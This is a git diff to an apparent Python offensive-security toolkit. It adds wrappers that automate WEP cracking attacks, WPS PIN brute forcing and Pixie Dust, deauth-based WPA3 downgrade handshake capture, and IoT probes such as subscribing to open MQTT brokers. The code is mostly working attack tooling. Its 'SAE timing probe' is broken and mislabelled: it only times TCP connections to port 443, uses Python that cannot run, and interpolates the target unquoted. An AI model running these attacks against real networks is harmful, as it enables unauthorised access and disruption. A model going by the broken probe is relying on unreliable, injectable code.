@@ -277,6 +277,79 @@ class AircrackSuite:
         result = self.layer.run(cmd, timeout=10)
         return "1 handshake" in result.stdout or "WPA (1 handshake)" in result.stdout
 
+    # ── WEP attacks ─────────────────────────────────────────────
+
+    def fake_auth(self, interface: str, bssid: str, *, delay: int = 0) -> CommandResult:
+        """Perform fake authentication against a WEP AP."""
+        cmd = (
+            f"aireplay-ng -1 {delay} -e '' -a {shlex.quote(bssid)} "
+            f"-h $(macchanger -s {shlex.quote(interface)} | grep -oP '[0-9a-f:]+' | head -1) "
+            f"{shlex.quote(interface)}"
+        )
+        return self.layer.run(cmd, sudo=True, timeout=30)
+
+    def arp_replay(self, interface: str, bssid: str, *, timeout: int = 300) -> CommandResult:
+        """ARP request replay attack to generate IVs for WEP cracking."""
+        cmd = f"aireplay-ng -3 -b {shlex.quote(bssid)} {shlex.quote(interface)}"
+        return self.layer.run(cmd, sudo=True, timeout=timeout)
+
+    def chopchop(self, interface: str, bssid: str, *, timeout: int = 300) -> dict:
+        """KoreK chopchop attack — decrypt a WEP packet without the key."""
+        cmd = (
+            f"aireplay-ng -4 -b {shlex.quote(bssid)} "
+            f"{shlex.quote(interface)} -F"
+        )
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+        return {
+            "command": cmd,
+            "success": "Use packetforge-ng" in result.stdout or result.returncode == 0,
+            "output": result.stdout[-2000:],
+        }
+
+    def fragment_attack(self, interface: str, bssid: str, *, timeout: int = 300) -> dict:
+        """Fragmentation attack — obtain a PRGA keystream from WEP."""
+        cmd = (
+            f"aireplay-ng -5 -b {shlex.quote(bssid)} "
+            f"{shlex.quote(interface)} -F"
+        )
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+        return {
+            "command": cmd,
+            "success": "Use packetforge-ng" in result.stdout or result.returncode == 0,
+            "output": result.stdout[-2000:],
+        }
+
+    def crack_wep(self, capture_file: str, *, bssid: Optional[str] = None) -> dict:
+        """Crack WEP key from captured IVs."""
+        bssid_arg = f"-b {shlex.quote(bssid)}" if bssid else ""
+        cmd = f"aircrack-ng {bssid_arg} {shlex.quote(capture_file)}"
+        result = self.layer.run(cmd, timeout=300)
+
+        found = False
+        key = ""
+        for line in result.stdout.splitlines():
+            if "KEY FOUND!" in line:
+                found = True
+                match = re.search(r"\[\s*(.+?)\s*\]", line)
+                if match:
+                    key = match.group(1)
+                break
+
+        return {
+            "command": cmd,
+            "found": found,
+            "key": key,
+            "output": result.stdout[-2000:],
+        }
+
+    def interactive_replay(self, interface: str, bssid: str, *, timeout: int = 120) -> CommandResult:
+        """Interactive packet selection replay (aireplay-ng -2)."""
+        cmd = (
+            f"aireplay-ng -2 -b {shlex.quote(bssid)} -F "
+            f"{shlex.quote(interface)}"
+        )
+        return self.layer.run(cmd, sudo=True, timeout=timeout)
+
 
 class Hashcat:
     """Wrapper around hashcat."""
@@ -565,20 +638,50 @@ class Ettercap:
 
 
 class Reaver:
-    """Wrapper around Reaver and Bully for WPS attacks (Pixie Dust and Bruteforce)."""
+    """Wrappers around Reaver, Bully, and Wash for WPS attacks."""
 
     def __init__(self, layer: NativeLayer):
         self.layer = layer
+
+    def wash_scan(self, interface: str, *, timeout: int = 30) -> dict:
+        """Scan for WPS-enabled access points using wash."""
+        cmd = f"timeout {int(timeout)} wash -i {shlex.quote(interface)} -C"
+        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
+
+        aps = []
+        for line in result.stdout.splitlines():
+            if not line.strip() or line.startswith("Wash") or line.startswith("BSSID") or line.startswith("---"):
+                continue
+            parts = line.split()
+            if len(parts) >= 6:
+                try:
+                    aps.append({
+                        "bssid": parts[0],
+                        "channel": parts[1],
+                        "rssi": parts[2],
+                        "wps_version": parts[3],
+                        "wps_locked": parts[4].upper() == "YES",
+                        "essid": " ".join(parts[5:]),
+                    })
+                except (IndexError, ValueError):
+                    continue
+
+        return {
+            "command": cmd,
+            "aps": aps,
+            "total": len(aps),
+            "output": result.stdout[-2000:],
+        }
 
     def pixie_dust(self, interface: str, bssid: str, *, channel: int, timeout: int = 120) -> dict:
         """Run a WPS Pixie Dust attack using reaver."""
         cmd = f"reaver -i {shlex.quote(interface)} -b {shlex.quote(bssid)} -c {int(channel)} -K 1 -vv"
         result = self.layer.run(cmd, sudo=True, timeout=timeout)
-        
+
         found_pin = False
         pin = ""
         wpa_psk = ""
-        
+
         for line in result.stdout.splitlines():
             if "WPS PIN:" in line:
                 found_pin = True
@@ -589,15 +692,86 @@ class Reaver:
                 match = re.search(r"WPA PSK:\s*'(.+?)'", line)
                 if match:
                     wpa_psk = match.group(1)
-                    
+
         return {
             "command": cmd,
             "success": found_pin,
             "pin": pin,
             "wpa_psk": wpa_psk,
-            "output": result.stdout[-2000:]
+            "output": result.stdout[-2000:],
         }
 
+    def brute_force(self, interface: str, bssid: str, *, channel: int,
+                    pin_start: str = "", timeout: int = 3600) -> dict:
+        """Full WPS PIN brute-force using reaver (slow, 4-11 hours)."""
+        pin_arg = f"-p {shlex.quote(pin_start)}" if pin_start else ""
+        cmd = (
+            f"reaver -i {shlex.quote(interface)} -b {shlex.quote(bssid)} "
+            f"-c {int(channel)} {pin_arg} -vv -d 2 -t 5 -N"
+        )
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+
+        found_pin = False
+        pin = ""
+        wpa_psk = ""
+
+        for line in result.stdout.splitlines():
+            if "WPS PIN:" in line:
+                found_pin = True
+                match = re.search(r"WPS PIN:\s*'(.+?)'", line)
+                if match:
+                    pin = match.group(1)
+            if "WPA PSK:" in line:
+                match = re.search(r"WPA PSK:\s*'(.+?)'", line)
+                if match:
+                    wpa_psk = match.group(1)
+
+        progress = ""
+        for line in reversed(result.stdout.splitlines()):
+            if "%" in line:
+                progress = line.strip()
+                break
+
+        return {
+            "command": cmd,
+            "success": found_pin,
+            "pin": pin,
+            "wpa_psk": wpa_psk,
+            "progress": progress,
+            "output": result.stdout[-3000:],
+        }
+
+    def bully_pixie(self, interface: str, bssid: str, *, channel: int,
+                    timeout: int = 120) -> dict:
+        """Run a WPS Pixie Dust attack using bully (alternative to reaver)."""
+        cmd = (
+            f"bully {shlex.quote(interface)} -b {shlex.quote(bssid)} "
+            f"-c {int(channel)} -d -v 3"
+        )
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+
+        found_pin = False
+        pin = ""
+        psk = ""
+
+        for line in result.stdout.splitlines():
+            if "pin:" in line.lower():
+                match = re.search(r"[Pp]in:\s*(\d+)", line)
+                if match:
+                    found_pin = True
+                    pin = match.group(1)
+            if "key:" in line.lower() or "psk:" in line.lower():
+                match = re.search(r"[Kk]ey:\s*(.+)", line)
+                if match:
+                    psk = match.group(1).strip()
+
+        return {
+            "command": cmd,
+            "success": found_pin,
+            "pin": pin,
+            "wpa_psk": psk,
+            "output": result.stdout[-2000:],
+        }
 
 class Hcxtools:
     """Wrapper around hcxdumptool and hcxpcapngtool for clientless PMKID attacks."""
@@ -1054,4 +1228,228 @@ class DNSEnumerator:
             "target": target,
             "info": info,
             "output": result.stdout[:3000],
+        }
+
+
+class IoTScanner:
+    """Scanner for IoT protocols — MQTT, UPnP/SSDP, mDNS, BLE, CoAP."""
+
+    def __init__(self, layer: NativeLayer):
+        self.layer = layer
+
+    def scan_mqtt(self, target: str, *, port: int = 1883, timeout: int = 15) -> dict:
+        """Probe an MQTT broker for open access and enumerate topics."""
+        # Try connecting without auth
+        cmd = f"timeout {timeout} mosquitto_sub -h {shlex.quote(target)} -p {port} -t '#' -C 10 -W {timeout}"
+        result = self.layer.run(cmd, timeout=timeout + 5)
+
+        messages = [l.strip() for l in result.stdout.splitlines() if l.strip()]
+        return {
+            "command": cmd,
+            "target": target,
+            "port": port,
+            "open": result.returncode == 0 or len(messages) > 0,
+            "messages": messages[:20],
+            "message_count": len(messages),
+        }
+
+    def scan_upnp(self, *, timeout: int = 10) -> dict:
+        """Discover UPnP/SSDP devices on the local network."""
+        # Use raw SSDP M-SEARCH via Python
+        cmd = (
+            f'timeout {timeout} python3 -c "'
+            'import socket,struct;'
+            's=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP);'
+            's.settimeout(5);'
+            's.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);'
+            "msg=b'M-SEARCH * HTTP/1.1\\r\\nHOST:239.255.255.250:1900\\r\\nMAN:\\\"ssdp:discover\\\"\\r\\nMX:3\\r\\nST:ssdp:all\\r\\n\\r\\n';"
+            "s.sendto(msg,('239.255.255.250',1900));"
+            'r=[]\\n'
+            'try:\\n'
+            ' while True:\\n'
+            '  d,a=s.recvfrom(4096);r.append(f\"{a[0]}: \"+d.decode(errors=\"ignore\").split(chr(10))[0])\\n'
+            'except: pass\\n'
+            "print(chr(10).join(r))\""
+        )
+        result = self.layer.run(cmd, timeout=timeout + 5)
+        devices = [l.strip() for l in result.stdout.splitlines() if l.strip()]
+        return {
+            "devices": devices,
+            "total": len(devices),
+        }
+
+    def scan_mdns(self, *, timeout: int = 10) -> dict:
+        """Discover mDNS/Bonjour services on the local network."""
+        cmd = f"timeout {timeout} avahi-browse -a -t -r -p 2>/dev/null | head -100"
+        result = self.layer.run(cmd, timeout=timeout + 5)
+        services = []
+        for line in result.stdout.splitlines():
+            parts = line.strip().split(";")
+            if len(parts) >= 7 and parts[0] == "=":
+                services.append({
+                    "interface": parts[1],
+                    "name": parts[3],
+                    "type": parts[4],
+                    "host": parts[6],
+                    "ip": parts[7] if len(parts) > 7 else "",
+                    "port": parts[8] if len(parts) > 8 else "",
+                })
+        return {
+            "services": services,
+            "total": len(services),
+            "output": result.stdout[-2000:],
+        }
+
+    def scan_ble(self, *, timeout: int = 10) -> dict:
+        """Scan for Bluetooth Low Energy devices using hcitool/bluetoothctl."""
+        cmd = f"timeout {timeout} hcitool lescan --duplicates 2>/dev/null"
+        result = self.layer.run(cmd, sudo=True, timeout=timeout + 5)
+        devices = []
+        seen = set()
+        for line in result.stdout.splitlines():
+            if "LE Scan" in line:
+                continue
+            parts = line.strip().split(maxsplit=1)
+            if len(parts) >= 1 and ":" in parts[0] and parts[0] not in seen:
+                seen.add(parts[0])
+                devices.append({
+                    "mac": parts[0],
+                    "name": parts[1] if len(parts) > 1 else "(unknown)",
+                })
+        return {
+            "devices": devices,
+            "total": len(devices),
+            "output": result.stdout[-2000:],
+        }
+
+    def banner_grab(self, target: str, ports: str = "21,22,23,80,443,554,1883,5683,8080,8443,8883,49152",
+                    *, timeout: int = 30) -> dict:
+        """Grab banners from common IoT ports to fingerprint firmware."""
+        cmd = f"nmap -sV -p {ports} --open -T4 {shlex.quote(target)}"
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+
+        services = []
+        for line in result.stdout.splitlines():
+            if "/tcp" in line and "open" in line:
+                services.append(line.strip())
+
+        return {
+            "command": cmd,
+            "target": target,
+            "services": services,
+            "service_count": len(services),
+            "output": result.stdout[-3000:],
+        }
+
+    def coap_discover(self, target: str, *, timeout: int = 10) -> dict:
+        """Discover CoAP resources on an IoT device."""
+        cmd = f"timeout {timeout} coap-client -m get coap://{shlex.quote(target)}/.well-known/core 2>/dev/null"
+        result = self.layer.run(cmd, timeout=timeout + 5)
+        resources = []
+        for part in result.stdout.split(","):
+            part = part.strip()
+            if part.startswith("<"):
+                resources.append(part)
+        return {
+            "command": cmd,
+            "target": target,
+            "resources": resources,
+            "total": len(resources),
+            "output": result.stdout[-2000:],
+        }
+
+
+class WPA3Attacker:
+    """WPA3/SAE attack tools — Dragonblood, side-channel, downgrade attacks."""
+
+    def __init__(self, layer: NativeLayer):
+        self.layer = layer
+
+    def check_sae_support(self, interface: str, bssid: str, *, timeout: int = 15) -> dict:
+        """Check if a target AP supports SAE/WPA3."""
+        cmd = f"iw dev {shlex.quote(interface)} scan | grep -A 20 {shlex.quote(bssid)}"
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+
+        supports_sae = "SAE" in result.stdout or "WPA3" in result.stdout
+        supports_owe = "OWE" in result.stdout
+        transition_mode = "WPA2" in result.stdout and ("SAE" in result.stdout or "WPA3" in result.stdout)
+
+        return {
+            "command": cmd,
+            "bssid": bssid,
+            "supports_sae": supports_sae,
+            "supports_owe": supports_owe,
+            "transition_mode": transition_mode,
+            "output": result.stdout[-2000:],
+        }
+
+    def downgrade_attack(self, interface: str, bssid: str, *, channel: int,
+                         timeout: int = 120) -> dict:
+        """
+        WPA3 transition mode downgrade attack.
+        Force clients to use WPA2 by selectively deauthing WPA3 associations
+        and capturing WPA2 handshakes instead.
+        """
+        lines = []
+        # Step 1: Deauth to force reconnection
+        deauth_cmd = (
+            f"aireplay-ng -0 5 -a {shlex.quote(bssid)} "
+            f"{shlex.quote(interface)}"
+        )
+        result = self.layer.run(deauth_cmd, sudo=True, timeout=30)
+        lines.append(f"Deauth sent: {result.returncode == 0}")
+
+        # Step 2: Capture in hopes of WPA2 fallback handshake
+        import tempfile
+        prefix = tempfile.mktemp(dir="/tmp", prefix="wpa3_downgrade_")
+        cap_cmd = (
+            f"timeout {timeout} airodump-ng -c {channel} --bssid {shlex.quote(bssid)} "
+            f"-w {prefix} {shlex.quote(interface)}"
+        )
+        result = self.layer.run(cap_cmd, sudo=True, timeout=timeout + 10)
+        lines.append(f"Capture complete")
+
+        # Check for handshake
+        cap_file = f"{prefix}-01.cap"
+        has_handshake = False
+        try:
+            check = self.layer.run(f"aircrack-ng {cap_file} 2>/dev/null | grep handshake", timeout=10)
+            has_handshake = "handshake" in check.stdout.lower()
+        except Exception:
+            pass
+
+        return {
+            "success": has_handshake,
+            "capture_file": cap_file if has_handshake else "",
+            "transition_mode_exploited": has_handshake,
+            "log": lines,
+        }
+
+    def sae_timing_probe(self, target: str, *, timeout: int = 30) -> dict:
+        """
+        Probe for SAE timing side-channel vulnerability (CVE-2019-9494).
+        Sends multiple SAE authentication frames and measures response times.
+        """
+        cmd = (
+            f"timeout {timeout} python3 -c \""
+            "import socket,time,struct,sys;"
+            "results=[];"
+            "for i in range(5):"
+            " try:"
+            f"  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            f"  s.settimeout(3);"
+            f"  t0=time.time();"
+            f"  s.connect(('{target}',443));"
+            f"  dt=time.time()-t0;"
+            f"  results.append(dt);"
+            f"  s.close();"
+            " except:results.append(-1);"
+            f"print('Timing:',results)\""
+        )
+        result = self.layer.run(cmd, timeout=timeout + 5)
+        return {
+            "command": "SAE timing probe",
+            "target": target,
+            "output": result.stdout[-1000:],
+            "note": "Manual analysis required — look for timing variance > 50ms indicating vulnerable SAE implementation",
         }
